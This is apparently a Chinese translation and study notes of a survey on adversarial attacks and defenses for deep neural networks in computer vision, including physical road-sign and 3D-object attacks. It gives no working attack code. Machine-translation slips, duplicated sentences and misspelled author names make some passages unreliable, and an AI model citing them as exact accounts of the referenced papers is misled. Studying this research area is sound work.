通过最小化由两部分组成的联合损失函数，计算了这些网络产生的对抗性例子; 第一部分限制对抗示例与原始图像具有感知相似性，而第二部分旨在改变目标网络对结果图像的预测。 沿着相同的方向，Hayex和Danezis[47]还使用attacker neural network 来学习黑匣子攻击的对抗性例子。在给出的结果中，attacker neural network计算的示例与干净的图像在本质上不可区分，但它们被目标网络以压倒性的概率错误分类-在MNIST数据[10]上将分类精度从99.4%降低到0.77%，在CIFAR-10数据集[152]上将分类精度从91.4%降低到6.8%。 ¶3.1.12 Miscellaneous Attacks 这里论文里列举的实在太多了，就以论文中的表格来概括吧； 表格中4星以上的攻击方法，之后应该都会出专门的文章进行学习和介绍的，也包括学习过程中的代码实现； ¶3.2 Attacks beyond classification/recognition ​ 除了Houdini[131]之外，第3.1节中回顾的所有主流攻击都直接集中在分类任务上——通常愚弄基于CNN的分类网络[10]。然而，由于对抗性威胁的严重性，除了计算机视觉中的分类/识别任务外，攻击也被积极地研究。接下来让我们回顾深层神经网络攻击分类之外算法的工作。 ¶3.2.1 Attacks on Autoencoders and Generative Models Tabacof等人[128]研究了针对autoencoders的对抗性攻击[154]，并提出了一种扭曲输入图像（使其具有对抗性）的技术，这种技术会误导自动编码器重建完全不同的图像。他们的方法攻击神经网络的内部特征，使得攻击图像的特征与目标图像的特征相似。 然而，据[128]报道，与典型的分类器网络相比，自动编码器似乎对对抗性攻击更具鲁棒性。Kos等人[121]还探索了计算深层生成模型的高级示例的方法，例如变分自动编码器（VAE）和VAE生成对抗网络（VAE-GANs） GAN 像[153]这样的现在在计算机视觉领域非常流行，应用程序可以学习数据分布并生成真实的图像. 作者介绍了针对VAE和VAE-GANs的三种不同类型的攻击。由于这些攻击的成功，我们可以得出结论，深层生成模型也能够攻击,这些攻击会使得输入转化为非常不同的输出。这项工作进一步支持了“ 对抗性例子是当前神经网络结构的普遍现象”这一假设。也就是说当前神经网络普遍会受到对抗性例子的影响； ¶3.2.2 Attack on Recurrent Neural Networks ​ Papernot等人[110]成功地为递归神经网络（RNN）生成了对抗性输入序列。RNN是一种深度学习模型，特别适合学习顺序输入和输出之间的映射[155]。Papernot等人证明，为前向神经网络（如FGSM[23]）计算对抗性示例的算法也可用于欺骗RNN。特别是，作者成功地愚弄了流行的长短时记忆（LSTM）RNN架构[156]。结论是，循环神经网络模型（如RNN）也不能免疫非循环神经网络（即CNN）中最初发现的对抗性扰动. ¶3.2.3 Attacks on Deep Reinforcement Learning Lin等人[134]提出了两种不同的对抗性攻击，专门用于深度强化学习[157]。第一种攻击，被称为“策略定时攻击”，对手通过在一个事件中的一小部分的时间内进行攻击来使得agent的奖励值最小化。这提出了一种确定何时制作和应用对抗性示例的方法，使攻击不被发现。在第二种攻击中，称为‘enchanting attack’（附魔攻击），对手通过集成生成模型和规划算法将agent（智能体）引诱到指定的目标状态。生成模型用于预测agent的未来状态，而规划算法用于生成引诱agent的行为。针对由最先进的深度强化学习算法[157]、[158]训练的代理，成功地测试了这些攻击。 在另一项研究中，Huang等人[62]证明，FGSM[23]也可用于在深度强化学习的背景下显著降低模型的准确度。 ¶3.2.4 Attacks on Semantic Segmentation and Object De- tection 在Moosavi Dezfouli[16]的启发下，Metzen等人[67]证明了图像不可知伦中准不可察觉pertur-bations的存在，这种pertur-bations可以欺骗深层神经网络，显著破坏图像的预测分割。此外，他们还表明，可以计算噪声向量，在保持大部分图像分割不变的情况下（例如，从道路场景中移除行人），从分割的类中移除特定的类。 虽然有人认为“用于语义图像分割的高级扰动空间可能比图像分类的小”，但这种扰动对于不可见的验证图像具有很高的概率去推广。Arnab等人[51]还评估了基于FGSM[23]的用于语义分割的对抗性攻击，并指出许多关于这些用于分类的攻击的观察结果并没有直接转移到分割任务。 Xie等人[115]计算了用于语义分割和目标检测的对抗性示例，观察到这些任务可以表示为对图像中的多个目标进行分类-目标是分割中的一个像素或一个感受野，以及检测中的目标建议。 在这种观点下，他们的方法称为“密集敌方生成”（Dense Adversary Generation），它优化了一组像素/方案上的损失函数，以生成敌方示例。生成的例子被测试来愚弄各种基于深度学习的分割和检测方法。他们的实验评估不仅成功地愚弄了目标网络，而且还表明所产生的扰动在不同的网络模型中具有良好的通用性。在下图中，展示了使用[115]中的方法进行分割和检测的网络欺骗的代表性示例。 ¶4. ATTACKS IN THE REAL WORLD ¶4.0.1 Attacks on Face Attributes 人脸属性是现代安全系统中新兴的软生物特征识别技术之一。虽然人脸属性识别也可以被归类为一个分类问题，但由于人脸识别本身被视为计算机视觉中的一个主流问题，因此我们分别回顾了这方面的一些有趣的攻击。 Rozsa等人[130]，[160]利用CelebA基准[161]探索了多种深度学习方法的稳定性，通过生成对抗性的例子来改变人脸识别的结果；看下图： 通过使用所谓的“快速翻转属性”技术攻击深度网络分类器，他们发现深度神经网络对对手攻击的鲁棒性在不同的面部属性之间存在很大差异。对抗性攻击可以有效地将目标属性的标签转换为相关属性。 Shen等人[144]提出了两种不同的技术来生成具有高“吸引力分数”但“主观分数”较低的人脸的对抗性示例，用于使用深度神经网络进行人脸吸引力评估。有关人脸识别任务的进一步攻击，请参阅[185]。第3节回顾的文献假设对手直接用图像扰动反馈深层神经网络。此外，还使用标准图像数据库评估了攻击的有效性。尽管这些设置已经证明足以说服许多研究人员，对抗性攻击是实践中深入学习的真正关注点，但我们在文献中也遇到了一些实例（例如[48]，[30]）这种担忧被轻描淡写，对抗性的例子被认为“只是好奇的问题”，几乎没有实际的担忧。因此，本节专门介绍在实际情况下处理对抗性攻击的文献，以帮助解决争论 ¶4.1 Cell-phone camera attack Kurakin等人[35]首先证明了防御攻击的威胁也存在于物理世界中。为了说明这一点，他们打印了敌对的图像，并用手机摄像头拍下了照片。这些图像被输入到Tensor-Flow相机演示应用程序[181]，该应用程序使用谷歌的Inception模型[145]进行对象分类。结果表明，即使通过相机观察，也有很大一部分图像被错误分类。在图6中，示出了原稿的示例。 以下网址还提供了一段视频[https://youtu.be/zQ uMenoBCk ](https://youtu.be/zQ uMenoBCk )显示了进一步的图像敌对攻击的威胁。这项工作研究了FGSM[23]、BIM和ILCM[35]在物理世界中的攻击方法。 ¶4.2 Road sign attack ​ Etimov等人[75]在[36]和[88]中提出的攻击的基础上，设计了物理世界的鲁棒扰动。他们证明了强大的物理条件，如在视角，距离和分辨率的变化是攻击的可能性。他们提出的算法称为RP2鲁棒物理扰动，用于生成对抗性的例子，道路标志识别系统。这个算法实现了高愚弄率在实际驾车设置。在这项工作中，针对物理路标引入了两种攻击类别：（a）海报打印：攻击者打印一张受到干扰的路标海报，并将其放置在真实的路标上（见下图）（b） 贴纸扰动：印刷在纸上，纸贴在真正的标志上。对于（b）两种类型的扰动进行了研究，（b1）细微扰动：占据整个标志，（b2）伪装扰动：标志上的涂鸦贴纸形式。因此，所有这些干扰都只需要彩色打印机，而不需要其他特殊硬件。成功地产生了（a）和（b）的扰动，使得扰动对物理世界中的自然变化保持鲁棒性，这表明了现实世界中敌对例子的威胁。 ​ Lu等人[30]之前曾声称，由于移动车辆中的物理条件不断变化，对抗性示例对于自动车辆中的目标检测不是一个问题。然而，他们所采用的攻击方法[22]、[23]、[35]有些原始。Etimov等人[75]的发现与[66]中的结果正交。然而，在后续研究中，Lu等人[19]表明，像YOLO 9000[149]和FasterrRcnn[150]这样的探测器“目前”没有被Etimov等人[75]引入的攻击所欺骗。在后续研究中，Lu等人[19]表明，像YOLO 9000[149]和Faster rRcnn[150]这样的探测器“目前”没有被Etimov等人[75]引入的攻击所欺骗。Zeng等人[87]还认为，图像空间中的对抗性扰动在物理空间中并不能很好地推广; 然而，Athalye等人[65]表明，我们实际上可以打印3D物体，以便在物理世界中进行成功的对抗性攻击。我们在第4.3节讨论[65]。 ​ Gu等人[33]还探讨了一个有趣的概念，神经网络外包训练面临的威胁。他们表明，有可能训练一个在用户的训练和验证样本上表现出最先进性能，但在攻击者选择的输入上表现糟糕的网络（BadNet）。他们在真实场景中演示了这种攻击，创建了一个街道标志分类器，当在停车标志上添加特殊标签时，该分类器将停车标志识别为限速标志。此外，研究发现，即使网络后来用额外的训练数据进行了微调，网络的愚弄行为仍然在合理的程度上存在。 ¶4.3 Generic adversarial 3D objects Athalye等人[65]介绍了一种构建3D对象的方法，这种方法可以在各种角度和视点上愚弄神经网络。他们的“对变换的期望”（EOT）框架能够构建对整个图像/对象变换分布具有对抗性的示例。他们的端到端方法能够打印任意对抗性的3D对象。在我们看来，这项工作的结果确定，对抗性攻击是一个真正的关注在物理世界的深入学习。图8展示了一个3D打印海龟的例子，它被EOT框架修改为步枪。以下网址提供了演示物理世界中被EOT愚弄的视频：https://www.youtube.com/watch?v=YXy6oX1iNoA&amp;feature=youtu.be ¶4.4 Cyberspace attacks Papernot等人[39]在现实世界中对网络空间中的深层神经网络分类器发起了第一次攻击。他们在合成数据上训练了一个替代网络来代替目标黑盒分类器，并举例说明了MetaMind、Amazon和Google对远程托管神经网络的攻击。他们能够证明各自的目标网络错误地分类了84.24%，96.19%和88.94%的由他们的方法产生的对抗性例子。实际上，攻击者在其威胁模型中唯一可用的信息是目标网络的输出标签，用于攻击者提供的输入图像。 在一项相关的工作中，Liu等人[88]开发了一种基于集合的攻击，并展示了它对攻击的成功。 Grosse等人[61]展示了为用作恶意软件分类工具的神经网络构建有效的通用攻击。与图像识别相比，恶意软件分类领域在对抗性设置中引入了额外的约束，如用离散输入代替连续输入域，用要求等价功能行为代替视觉相似性条件。然而，Grosse等人[61]表明，创建有效的对抗性示例对于恶意软件分类仍然是可能的。在[64]、[107]、[125]中还可以找到针对基于深度学习的恶意软件分类的成功对手攻击的更多示例。 ¶5 EXISTENCE OF ADVERSARIAL EXAMPLES ​ 在有关计算机视觉深度学习中的对抗性攻击的文献中，关于对抗性例子存在着不同的观点。这些观点通常与研究人员在攻击或防御深层神经网络时所做的局部经验观察很好地吻合。然而，它们在普及性方面往往不够。例如，Goodfello等人[23]流行的线性假设很好地解释了FGSM和相关攻击。然而，Tanay和Griffin[74]证明了线性分类器的图像类不会受到敌对示例的影响，这与线性假设不一致。更不用说，线性假设本身与先前流行的观点有很大的偏差. 对抗性的例子来源于深度神经网络引起的高度非线性的决策边界。文献中也有其他例子，其中线性假设没有得到直接支持[119]。 ​ 决策边界的平坦性[69]、决策边界的大局部曲线[70]和网络的低灵活性[71]是关于存在相互不完全一致的对抗性例子的观点的例子。很明显，只需修改图像中的一个像素就可以形成对抗性示例，但目前的文献似乎对存在对抗性示例的原因缺乏共识。这一事实也使得对抗性例子的分析成为一个积极的研究方向，有望探索和解释由深度神经网络（目前更普遍地被视为黑盒模型）所诱导的决策边界的性质。下面，我们回顾了主要集中在分析对抗性扰动的存在性以进行深入学习的工作。我们注意到，除了下面回顾的文献外，与对抗性攻击（第3节）和防御（第6节）相关的工作通常提供对抗性扰动的简要分析，同时推测导致存在对抗性例子的现象。 ¶5.1 Limits on adversarial robustness ​ Fawzi等人[118]提出了一个研究分类器对 对抗性扰动不稳定性的框架。他们根据数据集类别之间的“可分辨性度量”建立了分类器鲁棒性的基本限制，其中可分辨性定义为线性分类器的两个类别平均值之间的距离和所研究非线性模型的二阶矩矩阵之间的距离分类器。这项工作表明，对抗性的例子也存在于深层神经网络以外的分类中。本文的分析将对抗性不稳定性的现象追溯到分类器的低灵活性，这与当时的主流观点不完全正交，即网络的高非线性使它们容易受到对抗性例子的影响。 ¶5.2 Space of adversarial examples ​ Tabacof和Eduardo[25]在MNIST[10]和ImageNet[11]数据集上生成了浅层和深层网络分类器的对抗性示例，并利用不同分布和强度的噪声探测对抗性示例的像素空间。作者经验性地证明了对抗性例子出现在像素空间的大区域中，这与[23]中的类似主张是一致的。然而，在某种程度上与线性假设相反，他们认为一个弱的、浅的和更线性的分类器也像一个强的深分类器一样容易受到敌对例子的影响。 ​ Tramer等人[132]提出了一种估计对抗性例子空间维数的方法。据称，对抗性的例子跨越一个相邻的高维空间（例如，维度≈25）。由于高维性，不同分类器的子空间可以相交，从而导致对抗性例子的可转移性。有趣的是，他们的分析表明，即使分类器容易受到直接攻击，也有可能防御基于传输的攻击。 ¶5.3 Boundary tilting perspective ​ Tanay和Griffin[74]对深层神经网络中存在的对抗性例子提出了“边界倾斜”的观点。他们认为，为了学习和评估分类器而采样的单个类数据通常存在于该类的子流形中，并且当分类边界接近该子流形时，该类存在对抗性示例。他们将分类器的“对抗强度”概念形式化，并将其简化为所考虑的分类器边界和最近的质心分类器之间的“偏离角”。然后证明了分类器的对抗强度可以通过“边界倾斜”决策来改变。作者还认为分类器的对抗稳定性与其正则化有关。在Tanay和Griffin看来，关于存在对抗性例子的线性假设[23]是“不可信的”。 ¶5.4 training cause adversaries预测的不确定性与进化停滞 ​ Cubuk等人[91]认为，“对抗性测试的起源主要是由于神经网络对其预测的固有不确定性”。他们根据经验计算了不确定性的函数形式，这与网络结构、训练协议和数据集无关。有人认为，这种形式只依赖于统计的网络逻辑差异。这最终会导致敌对攻击导致的欺骗比率，从而显示出相对于扰动大小的通用缩放。他们研究了基于FGSM[23]、ILCM和BIM[35]的攻击来证实他们的说法。它还声称，网络在清晰图像上的准确性与其对抗性的健壮性相关（关于这个方向的更多论据，见第5.5节）。 ​ Rozsa等人[102]假设对抗性干扰的存在是训练图像上决策边界进化停滞的结果。他们认为，一旦分类正确，单个训练样本就不会导致模型（即神经网络）的训练损失，这最终会使它们接近决策边界。因此，通过添加微小的扰动，就有可能将这些（和类似的）样本丢弃到错误的类区域。他们提出了一种批量调整网络梯度（BANG）算法来训练网络，以缓解训练过程中的进化停滞。 ¶5.5 Accuracy-adversarial robustness correlation ​ 为了解释对抗性攻击的存在，Rozsa等人[97]实证分析了八个深度网络分类器的准确度与其对[23]、[94]中介绍的三种对抗性攻击的鲁棒性之间的关系。所研究的分类器包括AlexNet[9]、VGG-16和VGG-19网络[163]、伯克利训练的GoogLeNet和普林斯顿GoogLeNet版本[18]、ResNet-52、ResNet-101和ResNet-152[147]。使用[23]和[94]中提出的技术，借助大型ImageNet数据集[11]生成对抗性示例。他们的实验结果表明，分类精度较高的网络通常对敌方实例也表现出较强的鲁棒性。他们还得出结论，对抗性的例子在相似的网络拓扑之间传输得更好。 ¶5.6 More on linearity as the source ​ Kortov和Hopfield[127]在稠密联想记忆（DAM）模型的背景下检验了普遍扰动的存在[164]。与典型的现代深层神经网络相比，DAM模型采用了神经元之间更高阶（多于二次）的相互作用。作者已经证明，使用具有较小交互功率的DAM模型生成的对抗性测试无法愚弄具有高阶交互的模型，这类似于使用具有ReLU激活的深层神经网络来诱导线性[165]。作者提供了独立于FGSM[23]攻击的对抗性例子存在的经验证据，但支持Goodfello等人[23]的线性假设。 ¶5.7 Existence of universal perturbations ​ Moosavi-Dezfouli等人[16]最初认为，普遍对抗性扰动利用了分类器诱导的决策边界之间的几何相关性。它们的存在部分归功于包含决策边界的nor-mals的子空间，使得法线也围绕着自然图像。在[70]中，他们进一步建立了他们的理论，并证明了存在共同的方向（在数据点之间共享），沿着这些方向，分类器的决策边界可以高度正弯曲。他们认为这样的方向在宇宙扰动的存在中起着关键作用。基于他们的发现，作者还提出了一种新的几何方法来有效地计算普遍对抗摄动。 值得注意的是，先前Fawzi等人[69]也将分类器鲁棒性的理论界与决策边界的曲率联系起来。同样，Tramer等人[77]也认为，数据点附近决策边界的曲率是神经网络易受黑盒攻击的原因。在最近的另一项工作中，Mopuri等人[193]提出了一个类GAN模型来研究给定目标模型的普遍对抗扰动的分布。学习的分布也显示出良好的跨模型传递性。 ¶6 DEFENSES AGAINST ADVERSARIAL ATTACKS 目前，对抗性攻击的防御主要沿着三个方向发展： 1） 在学习过程中使用修改过的训练方式或在测试过程中使用修改过的输入。 2） 修改网络，例如通过添加更多层/子网络、更改丢失/激活功能等。 3） 当分类筛选看不见的示例时，使用外部模型作为网络附加组件。 ​ 第一个方法不直接处理学习模型。其他两类更关注神经网络本身。这两类技术又可分为两类，即完全防御和仅检测。“完全防御”方法旨在使目标网络能够在对抗性示例上实现其原始目标，例如，分类器以可接受的精度预测对抗性示例进行预测。另一方面，“仅检测”方法意味着对潜在的对抗性示例发出危险信号，以便在任何进一步处理中拒绝它们。所描述的类别的分类也示于下图中。剩下的部分是根据这个分类法组织的。在所使用的分类法中，“修改”网络和使用“附加组件”的区别在于前者在训练期间对原始的深层神经网络结构/参数进行了更改。另一方面，后者保持原始模型的完整性，并在测试过程中附加外部模型； ¶6.1 Modified training/input ¶6.1.1 Brute-force adversarial training【”蛮力对抗训练“】 ​ 自从发现深层神经网络的对抗性例子[22]以来，相关文献中有一个普遍的共识，即神经网络对这些例子的鲁棒性随着对抗性训练而提高。因此，引入新的对抗性攻击的大多数贡献，例如[22]、[23]、[72]（见第3节）同时提出了对抗性训练作为抵御这些攻击的第一道防线。尽管对抗性训练提高了网络的健壮性，但要想真正有效，它需要使用强攻击进行训练，并且网络的体系结构具有足够的表现力。由于对抗性训练需要增加训练/数据量，我们称之为“暴力的“策略。 ​ 文献中还普遍观察到，暴力对抗训练可使网络正规化（例如，见[23]，[90]），以减少过拟合，进而提高网络抵抗对抗攻击的鲁棒性。受此启发，Miyato等人[113]提出了一种“虚拟对抗训练”方法来平滑神经网络的输出分布。Zheng等人[116]还提出了一种相关的“稳定性训练”方法，以提高神经网络对输入图像小失真的鲁棒性。值得注意的是，尽管对抗性训练可以提高神经网络的鲁棒性，但Moosavi Dezfouli[16]表明，**对于已经经过对抗性训练的网络，可以再次计算有效的对抗性例子。**从这里就可以看出暴力对抗并不是一种很好的方法； ¶6.1.2 Data compression as defense 【数据压缩防御】 ​ Dziugaite等人[123]指出，大多数流行的图像分类数据集都包含JPG图像。基于这一观察，他们研究了JPG压缩对FGSM计算的扰动的影响[23]。据报道，JPG压缩实际上可以在很大程度上扭转FGSM扰动导致的分类精度下降。然而，我们得出结论，单靠压缩是远远不能有效防御的。Guo等人也对JPEG压缩进行了研究。郭等人[82]也对JPEG压缩进行了研究，以降低对抗性图像的有效性。Das等人[37]也采取了类似的方法，使用JPEG压缩来去除图像中的高频成分，并提出了一种基于集合的技术来对抗FGSM[23]和DeepFool方法[72]产生的敌对攻击。尽管[37]中报告了令人鼓舞的结果，但没有对更强的攻击进行分析。e.g. C&amp;W攻击[36]。此外，Shin和Song[186]已经证明了存在能够在JPEG压缩中幸存的对抗性示例。在我们之前的工作[81]中，我们还发现离散余弦变换（DCT）下的压缩不足以抵御普遍扰动[16]。基于压缩的防御的一个主要限制是，较大的压缩也会导致对干净图像的分类精度损失，而较小的压缩通常不能充分消除对抗性扰动。 ​ 在另一个相关的方法中，Bhagoji等人[169]提出使用主成分分析来压缩输入数据，以增强对抗性。然而，Xu等人[140]指出，这种压缩也会破坏图像的空间结构，因此通常会对分类性能产生不利影响。 ¶6.1.3 Foveation based defense 【中心凹防御】 ​ Luo等人[119]证明，使用L-BFGS[22]和FGSM[23]的对抗性攻击具有显著的鲁棒性，通过在图像的不同区域应用神经网络的“中心凹”机制是可能的。假设基于CNN的分类器在大型数据集（如ImageNet[11]）上训练，通常对图像中对象的缩放和平移变化具有鲁棒性。然而，这种不变性并没有扩展到图像中的对抗模式。这使得中央凹成为一个可行的选择，以减少在[22]，[23]中提出的对抗性攻击的有效性。然而，中心凹还没有证明其有效性更强大的攻击。 ¶6.1.4 Data randomization and other methods 【数据随机化和其他方法】 ​ Xie等人[115]表明，随机调整敌对例子的大小会降低其有效性。此外，在这些示例中添加随机填充也可以降低网络的欺骗率。Wang等人[138]用一个单独的数据转换模块转换输入数据，以消除图像中可能的敌对干扰。在文献中，我们还发现有证据表明，训练期间的数据增强（例如，高斯数据增强[46]）也有助于提高神经网络对敌对攻击的鲁棒性，尽管这一点很小。 ¶6.2 Modifying the network ​ 对于修改神经网络以抵御对手攻击的方法，我们首先讨论了“完全防御”方法。“仅检测”方法在第6.2.8节中单独进行了审查。 ¶6.2.1 Deep Contractive Networks【深度收缩网络】 ​ 在使深度学习对对抗性攻击具有鲁棒性的早期尝试中，Gu和Rigazio[24]引入了深度收缩网络（DCN）。结果表明，去噪自动编码器[154]可以减少对抗性噪声，但是将其与原始网络叠加可以使生成的网络更容易受到干扰。基于这一观察，DCNs的训练过程使用了类似于压缩自动编码器的平滑度惩罚[173]。自从DCNs最初被提出以来，已经引入了许多更强的攻击。使用自动编码器实现神经网络对抗鲁棒性的相关概念也可以在[141]中找到。 ¶6.2.2 Gradient regularization/masking 【梯度正则化/掩蔽】 ​ Ross和Doshi Velez[52]研究了输入梯度正则化[167]作为对抗鲁棒性的一种方法。他们的方法训练可微模型（例如深层神经网络），同时根据输入的变化惩罚导致输出的变化程度。这意味着，一个小的对抗性扰动不太可能彻底改变训练模型的输出。结果表明，该方法与暴力对抗训练相结合，对FGSM[23]和JSMA[60]等攻击具有很好的鲁棒性。然而，这些方法中的每一种都几乎使网络的训练复杂度增加了一倍，这在许多情况下都是不可行的。 ​ 此前，Lyu等人[28]还使用了将网络模型的损失函数梯度与输入相关的概念，以结合网络对基于L-BFGS[22]和FGSM[23]的攻击的鲁棒性。类似地，Shaham等人[27]试图通过在每次参数更新时最小化模型在对抗性示例中的损失来提高神经网络的局部稳定性。他们用最坏情况下的对抗性例子而不是原始数据来最小化模型的损失。在一项相关的工作中，Nguyen和Sinha[44]通过在网络的logit输出中添加噪声，引入了一种基于掩蔽的防御C&amp;W攻击的方法[36]。 ¶6.2.3 Defensive distillation 【防御蒸馏】 ​ Papernot等人[38]利用了“蒸馏”的概念[166]，使得深层神经网络能够抵御对手的攻击。Hinton等人[166]引入蒸馏作为一种训练过程，将更复杂网络的知识转移到更小的网络中。Papernot等人[38]引入的程序变体本质上是利用网络的知识来提高自身的健壮性。以训练数据的类概率向量的形式提取知识，并反馈训练原始模型。结果表明，这样做可以提高网络对图像小扰动的恢复能力。[108]中也提供了这方面的进一步经验证据。此外，在后续工作中，Papernot等人[84]还通过解决[38]中遇到的数值不稳定性，扩展了防御蒸馏方法。值得注意的是，第3.1节中介绍的“卡里尼和瓦格纳”（C&amp;W）攻击[36]被认为是成功对抗防御蒸馏技术的。我们还注意到，防御蒸馏也可以看作是“梯度掩蔽”技术的一个例子。然而，鉴于其在文献中的流行性，我们将其单独描述。 ¶6.2.4 Biologically inspired protection ​ Nayebi和Ganguli[124]证明了神经网络对具有高度非线性激活的对抗性攻击的自然鲁棒性（类似于非线性树突计算）。Nayebi和Ganguli[124]证明了神经网络对具有高度非线性激活的对抗性攻击具有自然鲁棒性（类似于非线性树突计算） ​ Krotov和Hopfield[127]的记忆模型也采用了类似的原理来抵抗对抗性例子。考虑到Goodfel-low等人[23]、[124]和[127]的线性假设，现代神经网络对对抗性例子的敏感性似乎是激活线性效应的概念得到了进一步的发展。我们注意到，Brendel和Bethge[187]声称，由于计算的数值限制，这些攻击在生物启发保护（Biologically inspired protection）[124]上攻击失败。稳定计算（Stabilizing the computations）再次成功攻击受保护的网络。 ¶6.2.5 Parseval Networks ​ 西塞等人[131]提出了“Parseval”网络作为对抗性攻击的防御。这些网络通过控制网络的全局Lipschitz常数采用分层正则化。考虑到一个网络可以被看作是一个函数的组合（在每一层），通过为这些函数保持一个小的Lipschitz常数，可以对小的输入扰动进行鲁棒性处理。Cisse等人提出通过用“parseval紧框架”参数化网络的权重矩阵来控制其谱范数[172]，因此命名为“parseval”网络。 ¶6.2.6 DeepCloak Gao等人[139]建议在处理分类的层之前插入一个掩蔽层。添加的层通过向前传递干净的和敌对的一对图像进行显式训练，并对这些图像对的前一层的输出特征之间的差异进行编码。有人认为，添加层中最主要的权重对应于网络中最敏感的特征（就对抗性操纵而言）。因此，在分类时，这些特征通过强制将添加层的主要权重设为零来掩盖。 ¶6.2.7 Miscellaneous approaches Zantedeschi等人[46]提出使用有界ReLU[174]来降低图像中敌对模式的有效性，这是使神经网络对敌对攻击具有鲁棒性的其他显著努力之一。Jin等人[120]介绍了一种前馈CNN，它使用加性噪声来减轻对抗性例子的影响。Sun等人[56]提出了“超网络”，它使用统计滤波作为一种方法，使网络健壮。Madry等人[55]从稳健优化的角度研究了对抗性防御。他们表明，与PGD对手进行对抗性训练可以成功地防御一系列其他对手。后来，卡里尼等人[59]也证实了这一观察结果。Na等人[85]采用了一种网络，该网络通过统一的嵌入进行正则化，用于分类和低水平的相似性学习。利用干净嵌入和相应的敌对嵌入之间的距离对网络进行惩罚。斯特劳斯等人[89]研究了一系列方法来保护网络免受干扰。Kadran等人[136]修改了神经网络的输出层，以增强对抗性攻击的鲁棒性。 Wang等人[129]，[122]通过利用网络中的不可逆数据转换开发了可以抵抗神经对抗样本的神经网络。Lee等人[106]开发了多种规则化网络，使用训练目标最小化干净图像和敌对图像的多层嵌入结果之间的差异。Kotler和Wong[96]提出学习基于ReLU的分类器，该分类器对小的对抗性扰动具有鲁棒性。他们训练的神经网络达到高精度（&gt; 90%）对抗规范环境中的任何对抗样本（ϵ=0.1\\epsilon=0.1ϵ=0.1 for ℓ∞\\ell_{\\infty}ℓ∞​，在MNIST数据集当中）。Raghunathan等人[189]研究了具有一个隐藏层的神经网络的防御问题。他们的方法在MNIST数据集上生成了一个网络和一个证书，使得对图像像素的干扰不超过ε=0.1的攻击都不会导致超过35%的测试错误。Kolter和Wong[96]以及Raghunathan等人[189]是为数不多的防御敌对攻击的可证明方法。考虑到这些方法在计算上不适用于更大的网络，唯一被广泛评估的防御措施是Madry等人[55]的防御措施，在MNIST上对大epsilon（0.3/1）的准确率为89%，在CIFAR上对中等epsilon（8/255）的准确率为45%。另一个可以被视为具有保证的对抗性攻击/防御的工作线索与深度神经网络的验证有关，例如[191]，[192]。OrOrbia等人[194]的研究表明，对抗性训练的许多不同建议是更普遍的正规化目标实例，他们称之为DataGrad。提出的DataGrad框架可以看作是分层压缩自编码惩罚的扩展。 ¶6.2.8 Detection Only approaches SafetyNet: Lu等人[66]假设，对抗性的例子在网络（后期）中产生的ReLU激活模式与干净图像产生的模式不同。基于这一假设，他们提出在目标模型上附加一个径向基函数SVM分类器，使得SVM使用由网络后期ReLUs计算的离散码。为了检测测试图像中的扰动，使用支持向量机将其编码与训练样本的编码进行比较。由[23]、[35]、[72]生成的对抗性示例的有效检测通过其框架SafetyNet进行了证明。 Detector subnetwork: Metzen等人[78]提出用一个子网来增强目标网络，该子网被训练用于检测输入中的敌对扰动的二进制分类任务。研究表明，将这样的网络附加到模型的内部层并使用对抗性训练有助于检测使用FGSM[23]、BIM[35]和DeepFool[72]方法产生的扰动。然而，Lu等人[66]后来表明，这种方法同样容易受到反措施的影响。 Exploiting convolution filter statistics: Li和Li[105]利用基于CNN的神经网络中卷积滤波器的统计特性将输入图像分类为干净的或敌对的。利用这些统计量设计了一个级联分类器，并对文献[22]、[114]中方法生成的85%以上的对抗性图像进行了检测。 Additional class augmentation: Grosse等人[57]提出用一个额外的类来增强潜在的目标神经网络模型，在这个类中，模型被训练来分类所有的对抗性例子。Hosseini等人[32]也采用了类似的策略来检测黑匣子攻击。 ¶6.3 Network add-ons ¶6.3.1 Defense against universal perturbations Akhtar等人[81]提出了一个防御框架，以抵抗使用普遍扰动产生的对抗性攻击[16]。该框架将额外的“预输入”层附加到目标网络中，并训练它们校正每一个turbed图像，以便分类器的预测与对同一图像的干净版本的预测相同。预输入层称为扰动校正网络（PRN），在不更新目标网络参数的情况下对其进行训练。通过从训练图像的PRN输入-输出差异中提取特征来训练单独的检测器。测试图像首先通过PRN，然后利用其特征检测扰动。如果检测到对抗性干扰，则使用PRN的输出对测试图像进行分类。图10示出了由PRN执行的校正。对去除的模式分别进行检测分析。 ¶6.3.2 GAN-based defense ​ Lee等人[101]使用流行的生成性对抗网络框架[153]来训练对FGSM[23]类攻击具有鲁棒性的网络。作者建议直接沿着generator network训练网络，试图为该网络产生扰动。在训练过程中，分类器不断尝试正确分类干净的和受干扰的图像。我们将此技术归类为“附加”方法，因为作者建议始终以这种方式训练任何网络。在另一个基于GAN的防御中，Shen等人[58]使用网络的生成器部分来校正扰动图像。 ¶6.3.3 Detection Only approaches Feature squeezing: Xu等人[43]提出利用特征压缩来检测图像的对抗性扰动。他们将两个外部模型添加到分类器网络中，这样这些模型可以减少图像中每个像素的颜色位深度，并对图像进行空间平滑。比较了目标网络对原始图像和压缩图像的预测。如果预测结果之间存在较大差异，则该图像被认为是一个对抗性的例子。尽管[43]证明了这种方法对更经典的攻击的有效性[23]，但后续工作[140]也声称该方法对更强大的C&amp;W攻击的效果相当好[36]。他等人[76]还将特征压缩与[175]中提出的系综方法相结合，以表明防御的强度并不总是通过组合它们而增加。 MagNet: Meng和Chen[45]提出了一个框架，该框架使用一个或多个外部探测器将输入图像分类为敌对或干净。在训练过程中，该框架旨在学习多种清晰图像。在测试阶段，发现远离流形的图像被视为对抗性的，并被拒绝。靠近流形（但不完全在流形上）的图像总是被重组为位于流形上，并且分类器被送入重组后的图像。将附近的图像吸引到干净图像的流形中，并将远处的图像丢弃的概念也启发了框架的名称，即磁铁。值得注意的是，卡里尼和瓦格纳（Carlini and Wagner）[188]最近证明，这种防御技术也可以在稍大的扰动下被击败。 **其他方法：**Liang等人[50]将图像的扰动视为噪声，并使用标量量化和空间平滑滤波器分别检测这些扰动。在一个相关的方法中，Feinman等人[86]提出通过利用不确定性估计（of dropout neural networks）和在神经网络的特征空间中执行密度估计来检测对抗性扰动。最后，利用所提出的特征，将单独的二值分类器训练成多示例检测器。Gebhart和Schrater[92]将神经网络计算视为图中的信息流，提出了一种通过对诱导图应用持久同调来检测对抗性扰动的方法。 ¶7 OUTLOOK OF THE RESEARCH DIRECTION ​ 在前面的几节中，我们全面回顾了最近关于对抗性攻击深度学习的文献。尽管在技术细节的这些部分中报告了一些有趣的事实，但下面我们将对这一新兴研究方向进行更一般性的观察。在没有深入了解这一领域的技术知识的情况下，讨论为读者提供了更广阔的前景。我们的论点是基于上述文献。 